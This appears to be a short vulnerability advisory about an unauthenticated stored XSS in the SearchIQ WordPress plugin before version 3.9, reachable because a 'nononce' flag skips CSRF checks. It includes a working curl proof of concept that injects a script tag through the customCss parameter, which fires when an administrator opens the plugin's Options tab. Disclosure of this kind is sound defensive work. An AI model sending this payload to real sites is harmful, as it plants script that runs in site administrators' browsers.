## WordPress Plugin Vulnerabilities

# SearchIQ < 3.9 - Unauthenticated Stored XSS

### Description

The plugin contains a flag to disable the verification of CSRF nonces, granting unauthenticated attackers access to the siq\_ajax AJAX action and allowing them to perform Cross-Site Scripting attacks due to the lack of sanitisation and escaping in the customCss parameter

### Proof of Concept

Once the plugin is configured with an API key (can be a dummy one such as 123):
curl https://example.com/wp-admin/admin-ajax.php --data "action=siq\_ajax&customCss=</textarea><script>alert('xss')</script>&nononce=1&task=set\_custom\_style"
The XSS will be triggered when an admin open the Options tab of the plugin (/wp-admin/admin.php?page=dwsearch&tab=tab-2)
